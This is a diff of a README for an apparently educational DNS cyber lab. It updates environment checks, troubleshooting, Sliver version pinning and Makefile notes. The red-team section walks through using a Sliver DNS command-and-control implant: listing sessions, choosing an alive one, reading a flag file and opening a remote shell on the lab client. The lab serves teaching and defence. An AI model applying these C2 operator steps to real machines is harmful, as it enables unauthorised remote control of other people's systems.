@@ -72,6 +72,51 @@ Before we begin, ensure you have the following:
 
 # ![lab-overview](README.assets/lab-overview.png)
 
+---
+
+## Lab Environment Verification
+
+Before starting the lab activities, verify that the environment is properly configured and DNS resolution is working.
+
+1. **Access the Client Shell:**
+
+   ```bash
+   make client_shell
+   ```
+
+2. **Test DNS Resolution:**
+
+   Verify that you can resolve domain names:
+
+   ```bash
+   dig google.com
+   ```
+
+   - **Expected Output:**
+
+     You should see a successful DNS query response with an answer section containing an IP address:
+
+     ```
+     ;; ANSWER SECTION:
+     google.com.        300    IN    A    142.250.X.X
+     ```
+
+   - **If the query fails:**
+     - Check that all containers are running: `make ps`
+     - Check the logs for dns_internal: `docker compose logs dns_internal`
+     - Check the logs for dns_public: `docker compose logs dns_public`
+     - Restart the environment: `make restart`
+
+3. **Exit the Client Shell:**
+
+   ```bash
+   exit
+   ```
+
+Once DNS resolution is working properly, you can proceed with the Red Team activities below.
+
+---
+
 # Red Team Activities
 
 In this section, we'll act as the attacker to understand how DNS can be used for covert communication.
@@ -245,40 +290,81 @@ While it's possible to transfer the payload over DNS, it's often slow. For this 
    After the implant connects, you should see a session appear:
 
    ```bash
-   sessions
+   sliver > sessions
    ```
 
-3. **Activate the Session:**
+   - **Important:** Check the **Health** column to identify active sessions:
 
-   Use the session ID displayed (e.g., `6126a4aa-6907-4de9-88c8-99824c8cccca`):
+     ```
+      ID         Transport   Remote Address   Hostname       Username   Operating System   Health
+     ========== =========== ================ ============== ========== ================== =========
+      0661ad0f   dns         n/a              b6f487f2b837   root       linux/amd64        [DEAD]
+      26b60830   dns         n/a              b6f487f2b837   root       linux/amd64        [DEAD]
+      ff210e00   dns         n/a              b6f487f2b837   root       linux/amd64        [ALIVE]
+     ```
+
+   - **Note:** You may see multiple sessions, some marked as `[DEAD]`. This is normal - DNS-based C2 connections can be finicky and may drop. Only use sessions marked as `[ALIVE]`.
+
+3. **If No Alive Sessions Exist:**
+
+   If all sessions show `[DEAD]`, restart the implant on the client:
+
+   - On the client shell, press `Ctrl+C` to stop the implant
+   - Run it again: `/shared-data/TENDER_HOSPITAL` (replace with your implant name)
+   - Wait a few seconds for it to reconnect
+   - Check `sessions` again in Sliver
+
+4. **Activate the Alive Session:**
+
+   Use the full session ID of an `[ALIVE]` session (e.g., `ff210e00-a7a0-4253-b9bf-0ac325cbea35`):
 
    ```bash
-   use 6126a4aa-6907-4de9-88c8-99824c8cccca
+   sliver > use ff210e00-a7a0-4253-b9bf-0ac325cbea35
+
+   [*] Active session AWKWARD_CURL (ff210e00-a7a0-4253-b9bf-0ac325cbea35)
    ```
 
-4. **Open a Remote Shell:**
+   - **Tip:** You can use the short ID (first 8 characters) or the full UUID.
+
+5. **Execute Commands Directly:**
+
+   You can now execute commands on the client without opening a full shell:
 
    ```bash
-   shell
+   sliver (AWKWARD_CURL) > cat /flag.txt
+   ```
+
+   - **Expected Output:** Contents of the `flag.txt` file:
+
+     ```
+     888888888888888888888888888888888888888888888888888888888888
+     888888888888888888888888888888888888888888888888888888888888
+     8888888888888888888888888P""  ""9888888888888888888888888888
+     [... ASCII art flag ...]
+     ```
+
+6. **Alternative: Open an Interactive Shell:**
+
+   For a more traditional shell experience:
+
+   ```bash
+   sliver (AWKWARD_CURL) > shell
    ```
 
    - **Note:** You may be prompted with a warning about OPSEC (Operational Security). Confirm to proceed.
+   - Press `Ctrl+C` to exit the remote shell.
 
-5. **Execute Commands on the Client:**
+7. **Verify Session is Still Alive:**
 
-   For example, to read the `flag.txt` file:
+   Periodically check if your session is still active:
 
    ```bash
-   cat /flag.txt
+   sliver (AWKWARD_CURL) > sessions
    ```
 
-   - **Expected Output:** Contents of the `flag.txt` file (if it exists).
+   If your session becomes `[DEAD]`, restart the implant on the client and use a new session.
 
-6. **Exit the Shell:**
-
-   Press `Ctrl+C` to exit the remote shell.
-
-7. **Terminate the Implant on the Client:**
+8. **Terminate the Implant on the Client:**
 
    On the client shell, press `Ctrl+C` to stop the implant.
 
@@ -788,70 +874,153 @@ failed to copy xattrs: failed to set xattr "security.selinux" on ...: operation 
 
 ## Sliver Version
 
-**Current Version**: v1.5.44 (Latest as of lab creation)
+**Current Version**: v1.5.38
 
-**Update Instructions**: To update Sliver version:
+**Important**: This is the last known stable version of Sliver with working DNS C2 functionality. Versions 1.5.39 through 1.5.44 have issues with DNS-based communication that cause implants to fail to connect or maintain sessions.
+
+**Known Issues with Newer Versions (1.5.39+)**:
+- DNS listener may fail to start properly
+- Sessions connect but immediately die
+- Unreliable communication over DNS transport
+- These issues are being tracked and should be resolved in Sliver v1.6.x
+
+**Recommendation**: **Do not upgrade** to versions 1.5.39-1.5.44. Wait for Sliver v1.6.0 release which should include fixes for DNS transport issues.
+
+**Update Instructions** (when v1.6.0 is released):
 1. Edit `c2_server/Dockerfile`
-2. Change `ENV SLIVER_RELEASE="v1.5.44"` to desired version
-3. Rebuild: `make build`
+2. Change `ENV SLIVER_RELEASE="v1.5.38"` to `ENV SLIVER_RELEASE="v1.6.0"`
+3. Rebuild: `make destroy && make build && make up`
 
-**Note**: Versions newer than v1.5.34 include gvisor dependencies requiring the x86 architecture constraint mentioned above.
+**Note**: All versions from v1.5.34 onwards include gvisor dependencies requiring the x86 architecture constraint mentioned above.
 
 ## Common Issues and Solutions
 
-### Issue: "no such image" error with Podman
-**Symptom**: Docker-compose reports "no such image: localhost/dns-cyber-lab-c2_server:latest: image not known" even after successful build.
+### Issue: DNS containers fail with "permission denied"
+**Symptom**: dns_public or dns_internal containers exit immediately with errors like "directory '/var/cache/bind' is not writable" or "/etc/bind/named.conf: parsing failed: permission denied"
 
-**Cause**: Podman (used as Docker backend on some systems) has image registry resolution quirks.
+**Cause**: BIND runs as user 'bind' (UID 53, GID 53) and needs write access to mounted volumes.
 
-**Solution**: Build and start services sequentially:
+**Solution**: The start.sh scripts automatically fix permissions at runtime. Ensure containers have the necessary capabilities:
+- Both dns_internal and dns_public have `privileged: true` in docker-compose.yml
+- Containers have `cap_add: [NET_ADMIN, CHOWN, FOWNER, DAC_OVERRIDE]`
+- Directory permissions are set to 775 for /var/cache/bind and /var/lib/bind
+- BIND is explicitly run as bind user with `named -u bind` flag
+
+If issues persist:
 ```bash
-make build
-docker-compose up -d
+make restart
+docker compose logs dns_public
+docker compose logs dns_internal
 ```
 
+### Issue: Sliver sessions are [DEAD]
+**Symptom**: All sessions show `[DEAD]` status in `sliver > sessions` output
+
+**Cause**: DNS-based C2 connections are inherently unstable due to UDP transport and network conditions. Sessions may timeout or drop.
+
+**Solution**: This is expected behavior with DNS C2:
+1. Restart the implant on the client (Ctrl+C and run again)
+2. Wait 5-10 seconds for reconnection
+3. Check `sessions` again - look for `[ALIVE]` sessions
+4. Use only alive sessions for command execution
+5. Consider generating implant with longer reconnect intervals: `--reconnect 5`
+
+### Issue: "no such image" error with Podman
+**Symptom**: Docker-compose reports image not found even after successful build.
+
+**Cause**: Image naming conflicts with local registry prefix.
+
+**Solution**: The docker-compose.yml has been updated to use `dns-cyber-lab-c2_server:latest` without the `localhost/` prefix. Build should work correctly now.
+
+### Issue: Docker Compose v2 syntax errors
+**Symptom**: Commands fail with "compose build requires buildx 0.17 or later"
+
+**Cause**: Outdated docker-compose or missing buildx plugin.
+
+**Solution**: On AWS Linux 2023, use the `make install` target which installs:
+- Docker/Moby with all dependencies
+- Docker Compose v2 plugin (not standalone v1)
+- Docker Buildx v0.17.1 or later
+
 ### Issue: Containers exit immediately on ARM Macs
-**Symptom**: c2_server or other containers exit with code 139 or crash logs showing "runtime: lfstack.push invalid packing"
+**Symptom**: c2_server or other containers exit with code 139 or crash logs
 
 **Cause**: Running x86 binaries requires QEMU emulation to be properly configured.
 
-**Solution**: The `emulator` service (tonistiigi/binfmt) should start first and install QEMU handlers. If issues persist:
+**Solution**: Emulator service has been removed from docker-compose.yml. If using ARM Mac:
 ```bash
 docker run --rm --privileged tonistiigi/binfmt --install all
 make up
 ```
 
-### Issue: Sliver server crashes during asset unpacking
-**Symptom**: c2_server exits with segfault or runtime errors during first boot
-
-**Cause**: Sliver's asset unpacking can be sensitive under emulation
-
-**Solution**: The entrypoint script has been modified to let Sliver unpack assets on first daemon start rather than during container initialization. If issues persist, try running `sliver-server unpack --force` manually inside the container.
-
 ## Development Environment
 
 This lab was developed and tested on:
-- **Host OS**: macOS (Apple Silicon - ARM64)
-- **Docker Backend**: Podman 5.2.5 with Docker compatibility
-- **Container Platform**: linux/amd64 (emulated via QEMU)
-- **Sliver Version**: v1.5.44
+- **Host OS**: Windows and AWS Linux 2023 (x86_64)
+- **Docker Backend**: Docker Desktop Windows) and Moby/Docker (AWS Linux 2023)
+- **Container Platform**: linux/amd64 (native on x86, emulated via QEMU on ARM)
+- **Sliver Version**: v1.5.38 (last stable version with working DNS C2)
+- **Docker Compose**: v2 (plugin-based, not standalone v1)
 
-**For Students**: Lab works identically on x86 Linux, Windows with Docker Desktop, or ARM Macs. No architecture-specific setup required.
+**For Students**: Lab works on:
+- x86 Linux (native performance)
+- Windows with Docker Desktop
+- AWS Linux 2023 EC2 instances
+
+**AWS Linux 2023 Setup**: Use the automated `make install` target which installs all prerequisites:
+```bash
+git clone https://github.com/jmanteau/dns-course-labs.git
+cd dns-course-labs/dns-cyber-lab
+make install
+```
+
+This installs:
+- Docker/Moby with all required packages
+- Docker Compose v2 plugin
+- Docker Buildx v0.17.1+
+- Git (if not present)
+- Clones/refreshes the repository
 
 ## File Structure Notes
 
-- `c2_server/Dockerfile`: Downloads pre-built Sliver binaries for x86 (fast, no compilation needed)
-- `c2_server/entrypoint.sh`: Handles Sliver server initialization and operator config
-- `docker-compose.yml`: All services have `platform: linux/amd64` set explicitly
-- `Makefile`: Contains `DOCKER_BUILDKIT=0` export for macOS compatibility
+- `c2_server/Dockerfile`: Downloads pre-built Sliver v1.5.38 binaries for x86 (fast, no compilation needed). Includes GPG signature verification for security.
+- `c2_server/entrypoint.sh`: Handles Sliver server initialization, asset unpacking, and operator config generation
+- `dns_public/start.sh` & `dns_internal/start.sh`: Startup scripts that fix BIND permissions (UID 53:53) and start named with `-u bind` flag
+- `docker-compose.yml`:
+  - All services have `platform: linux/amd64` set explicitly for cross-platform compatibility
+  - DNS containers have `privileged: true` and extended capabilities for permission management
+  - Uses Docker Compose v2 syntax (space, not hyphen: `docker compose`)
+- `Makefile`:
+  - Disables Docker BuildKit (`DOCKER_BUILDKIT=0`) for macOS compatibility
+  - Includes `install` target for automated AWS Linux 2023 setup
+  - All commands use `docker compose` (v2) instead of `docker-compose` (v1)
 
 ## Makefile Commands
 
+### Setup and Installation
+- `make install`: Install Docker, Docker Compose, and all prerequisites on AWS Linux 2023 (run once per system)
+
+### Container Management
 - `make build`: Build all images without starting containers
 - `make up`: Start all containers (will build if needed)
-- `make down` or `make stop`: Stop all containers
+- `make stop`: Stop all containers without removing them
+- `make restart`: Restart all containers
 - `make destroy`: Complete cleanup of containers, images, and volumes
-- `make <container>_shell`: Access shell of specific container (e.g., `make c2_server_shell`)
+- `make ps`: Show status of all containers (including stopped ones)
+- `make ls`: List running containers with formatted output
+
+### Logs
+- `make logs1`: Show logs from the last 1 minute
+- `make logs5`: Show logs from the last 5 minutes
+
+### Shell Access
+- `make <container>_shell`: Access shell of specific container
+  - `make c2_server_shell`: Access C2 server (Sliver)
+  - `make client_shell`: Access client container
+  - `make dns_internal_shell`: Access internal DNS server
+  - `make dns_public_shell`: Access public DNS server
+  - `make firewall_shell`: Access firewall container
+  - `make webserver_shell`: Access web server container
 
 ---
 
